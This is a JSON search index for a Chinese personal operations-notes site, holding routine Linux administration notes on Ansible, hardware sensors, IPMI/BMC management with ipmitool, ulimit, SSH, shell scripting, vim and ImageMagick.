{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u6b22\u8fce\u6765\u5230\u8fd0\u7ef4\u867e\u7684\u4e16\u754c","text":"<p>\u91cd\u65b0\u6c89\u6dc0\u3001\u91cd\u6784\u6587\u7ae0\u3001\u7ee7\u7eed\u4f20\u9012</p> <ul> <li>\u901a\u8fc7\u6301\u7eed\u6709\u6548\u7684\u8fd0\u52a8\u6765\u4fdd\u6301\u8eab\u6750</li> <li>\u901a\u8fc7\u6b63\u786e\u53ca\u65f6\u7684\u5b66\u4e60\u6765\u4fdd\u6301\u7cbe\u8fdb</li> <li>\u901a\u8fc7\u548c\u66f4\u4f18\u79c0\u7684\u4eba\u5efa\u7acb\u5708\u5c42\u6548\u76ca\u4e92\u76f8\u8d4b\u80fd</li> </ul>"},{"location":"#_2","title":"\u5206\u7ad9\u5217\u8868","text":"\u5206\u7ad9 \u5730\u5740 \u7b14\u8bb0 https://books.8ops.top \u7b14\u8bb0 - docsify https://docsify.8ops.top/ \u7b14\u8bb0 - docsify https://8ops.github.io/docsify \u7b14\u8bb0 - mkdocs https://mkdocs.8ops.top/ \u7b14\u8bb0 - mkdocs https://8ops.github.io/mkdocs/ Json\u683c\u5f0f\u5316 - jsonviewer https://jsonviewer.8ops.top Json\u683c\u5f0f\u5316 - bejson https://jsonviewer.8ops.top/bejson/index.html \u56fe\u5f62\u8bbe\u8ba1 https://asciiflow.8ops.top/"},{"location":"#_3","title":"\u63a8\u8350\u4f18\u60e0","text":"\u963f\u91cc\u4e91\uff08Aliyun\uff09\u4f18\u523b\u4e91\uff08UCloud\uff09\u53c8\u62cd\u4e91\uff08Upyun\uff09 <p>\u4e3a\u751f\u6c11\u7acb\u547d\uff0c\u4e3a\u5929\u5730\u7acb\u5fc3\uff0c\u4e3a\u5f80\u5723\u7ee7\u7edd\u5b66\uff0c\u4e3a\u4e07\u4e16\u5f00\u592a\u5e73\u3002</p>"},{"location":"about/","title":"\u5173\u4e8e\u6211","text":"<p>Jesse</p>"},{"location":"daily/09-ansible/","title":"Ansible","text":""},{"location":"daily/09-ansible/#install","title":"\u4e00\u3001install","text":"<pre><code>pip install ansible\n\n# env\nANSIBLE_INVENTORY=/opt/ansible/config/hosts\nANSIBLE_TRANSFORM_INVALID_GROUP_CHARS=silently\nANSIBLE_CONFIG=/opt/ansible/config/ansible.cfg\n</code></pre>"},{"location":"daily/09-ansible/#_1","title":"\u4e8c\u3001\u914d\u7f6e","text":"<pre><code># ansible.cfg\n[defaults]\nANSIBLE_DEPRECATION_WARNINGS=False\nANSIBLE_COMMAND_WARNINGS=False\ninventory      = ./hosts\ngathering = smart\nfact_caching = jsonfile\nfact_caching_connection = /tmp/cache/facts\ntimeout = 60\n[privilege_escalation]\n[paramiko_connection]\n[ssh_connection]\nssh_args = -C -o ControlMaster=auto -o ControlPersist=60s -o ServerAliveInterval=30 -o ServerAliveCountMax=10\n[accelerate]\n[selinux]\n[colors]\n[diff]\n</code></pre>"},{"location":"daily/09-ansible/#_2","title":"\u4e09\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"daily/09-ansible/#31-connection","title":"3.1 connection","text":"<pre><code># 1\uff0c\u8d85\u65f6 /etc/ssh/sshd_config\nClientAliveInterval 60\nClientAliveCountMax 3\n\n# 2\uff0chost key\n\n# 3\uff0c\u76ee\u6807\u673a\u5668python\u7248\u672c\n# python3.6 \u6709\u660e\u663e\u9519\u8bef\nln -sf /usr/local/python3.9/bin/python3.9 /usr/bin/python3\n\nls -lt /usr/bin/pyt*\n/usr/bin/python3 -&gt; /usr/local/python3.9/bin/python3.9\n\n# 4\uff0cansible \u7248\u672c\npip install --upgrade ansible\n</code></pre>"},{"location":"daily/10-hardware/","title":"\u786c\u4ef6\u7ba1\u7406","text":""},{"location":"daily/10-hardware/#sensors","title":"\u4e00\u3001sensors","text":"<p>\u7269\u7406\u673a\u4f20\u611f\u5668</p>"},{"location":"daily/10-hardware/#11","title":"1.1 \u5b89\u88c5","text":"<pre><code># support x86_64\ngetconf LONG_BIT\n\n# ubuntu \napt install lm-sensors\n\n# centos\nyum install lm_sensors\n</code></pre>"},{"location":"daily/10-hardware/#12","title":"1.2 \u5206\u6790","text":"<pre><code>sensors -v\n\nsensors\n\n# sample\ntg3-pci-0201\nAdapter: PCI adapter\ntemp1:        +52.0\u00b0C  (high = +100.0\u00b0C, crit = +110.0\u00b0C)\n\ncoretemp-isa-0001\nAdapter: ISA adapter\nPackage id 1:  +55.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 0:        +47.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 1:        +47.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 2:        +47.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 3:        +47.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 4:        +47.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 5:        +46.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 6:        +48.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 7:        +47.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\n\npower_meter-acpi-0\nAdapter: ACPI interface\npower1:        0.00 W  (interval = 300.00 s)\n\ntg3-pci-0203\nAdapter: PCI adapter\ntemp1:        +52.0\u00b0C  (high = +100.0\u00b0C, crit = +110.0\u00b0C)\n\ntg3-pci-0200\nAdapter: PCI adapter\ntemp1:        +52.0\u00b0C  (high = +100.0\u00b0C, crit = +110.0\u00b0C)\n\ncoretemp-isa-0000\nAdapter: ISA adapter\nPackage id 0:  +47.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 0:        +40.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 1:        +40.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 2:        +41.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 3:        +39.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 4:        +40.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 5:        +41.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 6:        +40.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\nCore 7:        +41.0\u00b0C  (high = +80.0\u00b0C, crit = +90.0\u00b0C)\n\n# \u539f\u59cb\u6e29\u5ea6\u5b58\u50a8\u4f4d\u7f6e\ncat /sys/class/hwmon/hwmon1/temp1_input\n56000\n\n# vm \u4f1a\u56e0\u4e3a\u6ca1\u6709sensors\u800c\u62a5\u9519\n</code></pre>"},{"location":"daily/10-hardware/#ipmi","title":"\u4e8c\u3001IPMI","text":"<pre><code>\u4e00\u3001\u5f00\u5173\u673a\uff0c\u91cd\u542f\n\n1. \u67e5\u770b\u5f00\u5173\u673a\u72b6\u6001\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) power status\n\n2. \u5f00\u673a\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) power on\n\n3. \u5173\u673a\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) power off\n\n4. \u91cd\u542f\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) power reset\n\n\u4e8c\u3001\u7528\u6237\u7ba1\u7406\n\u8bf4\u660e\uff1a[ChannelNo] \u5b57\u6bb5\u662f\u53ef\u9009\u7684\uff0cChannoNo\u4e3a1\u6216\u80058\uff1bBMC\u9ed8\u8ba4\u67092\u4e2a\u7528\u6237\uff1auser id\u4e3a1\u7684\u533f\u540d\u7528\u6237\uff0cuser id\u4e3a2\u7684ADMIN\u7528\u6237\uff1b&lt;&gt;\u5b57\u6bb5\u4e3a\u5fc5\u9009\u5185\u5bb9\uff1b&lt;privilege level&gt;\uff1a2\u4e3auser\u6743\u9650\uff0c3\u4e3aOperator\u6743\u9650\uff0c4\u4e3aAdministrator\u6743\u9650\uff1b\n\n1. \u67e5\u770b\u7528\u6237\u4fe1\u606f\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) user list [ChannelNo]\n\n2. \u589e\u52a0\u7528\u6237\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) user set name &lt;user id&gt; &lt;username&gt;\n\n3. \u8bbe\u7f6e\u5bc6\u7801\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) user set password &lt;user id&gt; &lt;password&gt;\n\n4. \u8bbe\u7f6e\u7528\u6237\u6743\u9650\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) user priv &lt;user id&gt; &lt;privilege level&gt; [ChannelNo]\n\n5. \u542f\u7528/\u7981\u7528\u7528\u6237\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) user enable/disable &lt;user id&gt;\n\n\u4e09\u3001IP\u7f51\u7edc\u8bbe\u7f6e\n\u8bf4\u660e\uff1a[ChannelNo] \u5b57\u6bb5\u662f\u53ef\u9009\u7684\uff0cChannoNo\u4e3a1(Share Nic\u7f51\u7edc)\u6216\u80058\uff08BMC\u72ec\u7acb\u7ba1\u7406\u7f51\u7edc\uff09\uff1b\u8bbe\u7f6e\u7f51\u7edc\u53c2\u6570\uff0c\u5fc5\u987b\u9996\u5148\u8bbe\u7f6eIP\u4e3a\u9759\u6001\uff0c\u7136\u540e\u518d\u8fdb\u884c\u5176\u4ed6\u8bbe\u7f6e\uff1b\n\n1. \u67e5\u770b\u7f51\u7edc\u4fe1\u606f\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) lan print [ChannelNo]\n\n2. \u4fee\u6539IP\u4e3a\u9759\u6001\u8fd8\u662fDHCP\u6a21\u5f0f\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) lan set &lt;ChannelNo&gt; ipsrc &lt;static/dhcp&gt;\n\n3. \u4fee\u6539IP\u5730\u5740\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) lan set &lt;ChannelNo&gt; ipaddr &lt;IPAddress&gt;\n\n4. \u4fee\u6539\u5b50\u7f51\u63a9\u7801\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) lan set &lt;ChannelNo&gt; netmask &lt;NetMask&gt;\n\n5. \u4fee\u6539\u9ed8\u8ba4\u7f51\u5173\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) lan set &lt;ChannelNo&gt; defgw ipaddr &lt;\u9ed8\u8ba4\u7f51\u5173&gt;\n\n\u56db\u3001SOL\u529f\u80fd\n\u8bf4\u660e\uff1a&lt;9.6/19.2/38.4/57.6/115.2&gt;\u5176\u4e2d115.2\u4ee3\u8868115200\uff0c\u5373*1000\u662f\u8868\u793a\u7684\u6ce2\u7279\u7387\u3002\n\n1. \u8bbe\u7f6eSOL\u4e32\u53e3\u6ce2\u7279\u7387\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) sol set volatile-bit-rate &lt;9.6/19.2/38.4/57.6/115.2&gt;\n\n2. \u6253\u5f00SOL\u529f\u80fd\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) sol activate\n\n3. \u5173\u95edSOL\u529f\u80fd\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) sol deactivate\n\n\u4e94\u3001SEL\u65e5\u5fd7\u67e5\u770b\n\n1. \u67e5\u770bSEL\u65e5\u5fd7\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) sel list\n\n\u516d\u3001FRU\u4fe1\u606f\u67e5\u770b\n\n1. \u67e5\u770bFRU\u4fe1\u606f\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) fru list\n\n\u4e03\u3001SDR\uff0cSensor\u4fe1\u606f\u67e5\u770b\n\n1. \u67e5\u770bSDR Sensor\u4fe1\u606f\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) sdr\n\n2. \u67e5\u770bSensor\u4fe1\u606f\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) sensor list\n\n\u516b\u3001mc(\u7ba1\u7406\u5355\u5143BMC)\u72b6\u6001\u548c\u63a7\u5236\n\n1. \u91cd\u542f\u52a8BMC\uff1a\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) mc reset &lt;warm/cold&gt;\n\n\u4e5d\u3001\u8bbe\u7f6eBMC\u7684iptables\u9632\u706b\u5899\n\n1. \u8bbe\u7f6e\u67d0\u4e00\u6bb5IP\u53ef\u4ee5\u8bbf\u95eeBMC\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x76 0x01 0x01 ip1(0xa 0xa 0xa 0xa) ip2(0xb 0xb 0xb 0xb)\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x76 0x09\n\n2. \u8bbe\u7f6e\u67d0\u4e2aIP\u53ef\u4ee5\u8bbf\u95eeBMC\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x76 0x00 0x01 ip1(0xa 0xa 0xa 0xa)\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x76 0x09\n\n3. \u53d6\u6d88\u8bbe\u7f6e\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x76 0x08\n\n4\uff0e\u83b7\u53d6\u9632\u706b\u5899\u8bbe\u7f6e\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x77 0x01 0x00\n\n5. \u963b\u6b62/\u5f00\u542f\u67d0\u4e2a\u7aef\u53e3\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x76 0x02 0x00/0x01 0x00 (portno)0x22 0x00\n\n6. \u53d6\u6d88\u67d0\u4e2a\u7aef\u53e3\u7684\u8bbe\u7f6e\uff086\u662f5\u7684\u5bf9\u5e94\u53d6\u6d88\u64cd\u4f5c\uff09\nipmitool -H (BMC\u7684\u7ba1\u7406IP\u5730\u5740) -I lanplus -U (BMC\u767b\u5f55\u7528\u6237\u540d) -P (BMC \u767b\u5f55\u7528\u6237\u540d\u7684\u5bc6\u7801) raw 0x32 0x76 0x06 0x00/0x01 0x00 (portno)0x22 0x00\n</code></pre>"},{"location":"daily/11-system/","title":"\u7cfb\u7edf\u7ba1\u7406","text":""},{"location":"daily/11-system/#_2","title":"\u4e00\u3001\u5e38\u7528\u64cd\u4f5c","text":"<pre><code># \u83b7\u53d6 linux \u64cd\u4f5c\u7cfb\u7edf\u7684\u4f4d\u6570 \ngetconf LONG_BIT\n\n# \u751f\u6210\u5bc6\u7801\nopenssl rand -base64 20\nopenssl rand -hex 20\n</code></pre>"},{"location":"daily/11-system/#11-ulimit","title":"1.1 ulimit","text":"<pre><code># \u7cfb\u7edf\u7f3a\u7701\ncat &gt;&gt; /etc/security/limits.conf &lt;&lt; EOF\n\n* soft nofile 65536\n* hard nofile 65536\n* hard nproc 4096\n* soft nproc 4096\nEOF\n\ncat &gt; /etc/security/limits.d/90-nproc.conf &lt;&lt; EOF\n* soft    nproc     4096\nEOF\n\nulimit -SHn 65535\n\n# systemd \u7f3a\u7701\ncat &gt;&gt; /etc/systemd/system.conf &lt;&lt;EOF\nDefaultLimitNOFILE=65535\nDefaultLimitNPROC=4096\nEOF\n\ncat &gt;&gt; /etc/systemd/user.conf &lt;&lt;EOF\nDefaultLimitNOFILE=65535\nDefaultLimitNPROC=4096\nEOF\n\nsystemctl daemon-reexec\n</code></pre>"},{"location":"daily/11-system/#_3","title":"\u4e8c\u3001\u7528\u6237","text":"<pre><code># \u6dfb\u52a0\u7528\u6237\nuseradd jesse\n\n# \u6dfb\u52a0\u5230sudoer\n# user01    ALL=(ALL)   ALL # sudo -s \u9700\u8981\u5bc6\u7801\u5207\u6362\n# user02   ALL=(ALL)       NOPASSWD:ALL # \u514d\u5bc6\u5207\u6362\njesse   ALL=(ALL)   ALL\n</code></pre>"},{"location":"daily/11-system/#ssh","title":"\u4e09\u3001SSH","text":"<pre><code>ssh -i hostname -l username\nUnable to negotiate with 10.101.11.200 port 222: no matching host key type found. Their offer: ssh-rsa,ssh-dss\n\nssh -V\nOpenSSH_9.0p1, LibreSSL 3.3.6\n\n# \u9700\u8981\u964d\u7ea7\u52a0\u5bc6\u7b97\u6cd5\n~/.ssh/config\nHostKeyAlgorithms +ssh-rsa\nPubkeyAcceptedKeyTypes +ssh-rsa\n</code></pre>"},{"location":"daily/11-system/#31-proxycommand","title":"3.1 ProxyCommand","text":"<p><code>~/.ssh/config</code></p> <pre><code>Host jump\n    HostName 10.10.10.10\n    Port 22\n    User root\n    IdentityFile ~/.ssh/id_rsa\n\nHost 10.10.10.*\n    Port 22\n    User root\n    IdentityFile ~/.ssh/id_rsa\n    ProxyCommand ssh jump -W %h:%p\n</code></pre> <p>ProxyJump</p> <pre><code>$ ssh jump\n$ ssh 10.10.10.100\n</code></pre>"},{"location":"daily/11-system/#vim","title":"\u56db\u3001VIM","text":""},{"location":"daily/11-system/#41","title":"4.1 \u8bed\u6cd5\u9ad8\u4eae","text":"<pre><code># \u67e5\u770bcolorscheme\nls /usr/share/vim/vim*/colors/ ~/.vim/colors\n/usr/share/vim/vim90/colors:\nREADME.txt     default.vim    elflord.vim darkblue.vim\n\n~/.vim/colors:\nsolarized.vim\n\n# vim /usr/share/vim/vimrc \nvim ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme darkblue\nset ruler\n</code></pre>"},{"location":"daily/11-system/#cockpit","title":"\u4e94\u3001cockpit","text":"<p>\u7528\u4e8e CentOS 8 \u7684 Web \u754c\u9762</p> <pre><code>systemctl start cockpit.socket   # \u8fd0\u884cCockpit\u670d\u52a1\n\nsystemctl enable cockpit.socket  # \u542f\u52a8\u8be5\u670d\u52a1\uff0c\u968f\u7cfb\u7edf\u542f\u52a8\u4e00\u540c\u542f\u52a8\n\n*:9090\n</code></pre>"},{"location":"daily/11-system/#shell","title":"\u516d\u3001SHELL","text":""},{"location":"daily/11-system/#61","title":"6.1 \u53d1\u9001\u90ae\u4ef6","text":"<pre><code># \u8bf4\u660e\n# -f \u8868\u793afrom\uff0c\u53d1\u4ef6\u4eba\u5730\u5740\n# -t \u8868\u793ato\uff0c\u6536\u4ef6\u4eba\u5730\u5740\n# -s mail\u670d\u52a1\u5668\u57df\u540d\n# -u \u4e3b\u9898\n# -xu \u7528\u6237\u540d\uff08@\u4e4b\u524d\u7684\uff09\n# -xp \u7528\u6237\u5bc6\u7801\n# -m \u7eaf\u6587\u672c\u4fe1\u606f\n# -o message-file=/root/.. \u53d1\u9001\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\n# -a \u53d1\u9001\u9644\u4ef6 \uff08-m,-o,-a\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\uff09\n\n# \u666e\u901a\u53d1\u9001\n /usr/local/bin/sendEmail \\\n  -f xx@126.com \\\n  -t \"to\" \\\n  -cc \"cc\" \\\n  -u \"subject\" \\\n  -m \"message\" \\\n  -s smtp.126.com \\\n  -q \\\n  -xu xx@126.com \\\n  -xp pass \n\n# \u53d1\u9001html\ncat datafile | \\\n  /usr/local/bin/sendEmail \\\n  -f xx@126.com \\\n  -t \"to\" \\\n  -cc \"cc\" \\\n  -u \"subject\" \\\n  -s smtp.126.com \\\n  -q \\\n  -xu xx@126.com \\\n  -xp xx \\\n  -a $datafile \\\n  -o message-charset=utf8 \\\n  -o message-content-type=html \n</code></pre>"},{"location":"daily/11-system/#62-getopts","title":"6.2 getopts","text":"<pre><code>#!/bin/bash\n\necho \"[$OPTIND] [$#] [$*]\"\n\nwhile getopts \":a:bc:\" opt\ndo\ncase $opt in\n  a)\n    echo \"OUTPUT A[$OPTIND][$OPTARG]\"\n    ;;\n  b)\n    echo \"OUTPUT B[$OPTIND][$OPTARG]\"\n    ;;\n  c)\n    echo \"OUTPUT C[$OPTIND][$OPTARG]\"\n    ;;\n  *)\n    echo \"OUTPUT *[$OPTIND][$OPTARG]\"\n    ;;\nesac\ndone\n\nshift $(($OPTIND-1))\necho \"[$#] [$*]\"\n</code></pre> <p>debug</p> <pre><code>$ ./getopts.sh\n[1] [0] []\n[0] []\n\n$ ./getopts.sh -a\n[1] [1] [-a]\nOUTPUT *[2][a]\n[0] []\n\n$ ./getopts.sh -a a\n[1] [2] [-a a]\nOUTPUT A[3][a]\n[0] []\n\n$ ./getopts.sh -a a -b\n[1] [3] [-a a -b]\nOUTPUT A[3][a]\nOUTPUT B[4][]\n[0] []\n\n$ ./getopts.sh -a a -b -c c\n[1] [5] [-a a -b -c c]\nOUTPUT A[3][a]\nOUTPUT B[4][]\nOUTPUT C[6][c]\n[0] []\n\n$ ./getopts.sh -a a -b -c c xyz\n[1] [6] [-a a -b -c c xyz]\nOUTPUT A[3][a]\nOUTPUT B[4][]\nOUTPUT C[6][c]\n[1] [xyz]\n</code></pre>"},{"location":"daily/12-command/","title":"\u5e38\u7528\u547d\u4ee4","text":""},{"location":"daily/12-command/#_2","title":"\u9ad8\u9891","text":"<p>vim\u7f16\u8f91</p> <pre><code># --- \u547d\u4ee4\u6a21\u5f0f --- #\n# \u663e\u793a/\u53d6\u6d88\u884c\u53f7\nset nu\nset nonu\n\n# \u663e\u793a\u5217\u53f7\nset ruler\nset noruler\n\n# --- \u7f16\u8f91\u6a21\u5f0f --- #\n</code></pre>"},{"location":"daily/12-command/#_3","title":"\u8da3\u5473","text":"<p>figlet</p> <p></p> <p>banner</p> <p></p> <p>lolcat</p> <p></p>"},{"location":"daily/14-imagemagick/","title":"\u56fe\u7247\u5904\u7406","text":"<p><code>imagemagick</code>\u901a\u8fc7\u547d\u4ee4\u5904\u7406\u56fe\u7247</p>"},{"location":"daily/14-imagemagick/#convert","title":"convert","text":"<p>convert\u987e\u540d\u601d\u4e49\u5c31\u662f\u5bf9\u56fe\u50cf\u8fdb\u884c\u8f6c\u5316\uff0c\u5b83\u4e3b\u8981\u7528\u6765\u5bf9\u56fe\u50cf\u8fdb\u884c\u683c\u5f0f\u7684\u8f6c\u5316\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u505a\u7f29\u653e\u3001\u526a\u5207\u3001\u6a21\u7cca\u3001\u53cd\u8f6c\u7b49\u64cd\u4f5c\u3002</p> <p>\u62fc\u63a5</p> <pre><code>convert 1.png 2.png +append result.png #\u6a2a\u5411\nconvert 1.png 2.png -append result.png #\u7eb5\u5411\n</code></pre> <p>\u683c\u5f0f\u8f6c\u6362</p> <pre><code>convert foo.jpg foo.png\n</code></pre> <p>\u5c06\u6240\u6709jpg\u6587\u4ef6\u8f6c\u5316\u6210png</p> <pre><code>mogrify -format png *.jpg \n</code></pre> <p>convert\u8fd8\u53ef\u4ee5\u628a\u591a\u5f20\u7167\u7247\u8f6c\u5316\u6210pdf\u683c\u5f0f</p> <pre><code>convert *.jpg foo.pdf\n</code></pre> <p>\u5927\u5c0f\u7f29\u653e</p> <pre><code>convert -resize 100x100 foo.jpg thumbnail.jpg\n</code></pre> <pre><code>convert -resize 50%x50% foo.jpg thumbnail.jpg\n</code></pre> <p>\u6279\u91cf\u751f\u6210\u7f29\u7565\u56fe</p> <pre><code>mogrify -sample 80x60 *.jpg\n</code></pre> <pre><code>mogrify -sample 80%x60% *.jpg\n</code></pre> <p>\u5728\u4e00\u5f20\u7167\u7247\u7684\u56db\u5468\u52a0\u4e0a\u8fb9\u6846\u3002\u5176\u4e2d\"#000000\"\u662f\u8fb9\u6846\u7684\u989c\u8272\uff0c\u8fb9\u6846\u7684\u5927\u5c0f\u4e3a60x60</p> <pre><code>convert -mattecolor \"#000000\" -frame 60x60 yourname.jpg rememberyou.png\n</code></pre> <p>\u5728\u56fe\u7247\u4e0a\u52a0\u6587\u5b57\u3002\u5de6\u4e0a\u89d210x50\u7684\u4f4d\u7f6e\u7528\u7eff\u8272\u7684\u5b57\u5199\u4e0bcharry.org\uff0c\u6307\u5b9a\u522b\u7684\u5b57\u4f53\u7528-font</p> <pre><code>convert -fill green -pointsize 40 -draw 'text 10,50 \"charry.org\"' foo.png bar.png\n</code></pre> <p>\u9ad8\u65af\u6a21\u7cca\u3002-blur\u53c2\u6570\u8fd8\u53ef\u4ee5\u8fd9\u6837-blur 80x5\u3002\u540e\u9762\u7684\u90a3\u4e2a5\u8868\u793a\u7684\u662fSigma\u7684\u503c</p> <pre><code>convert -blur 80 foo.jpg foo.png\n</code></pre> <p>\u4e0a\u4e0b\u7ffb\u8f6c</p> <pre><code>convert -flip foo.png bar.png\n</code></pre> <p>\u5de6\u53f3\u7ffb\u8f6c</p> <pre><code>convert -flop foo.png bar.png\n</code></pre> 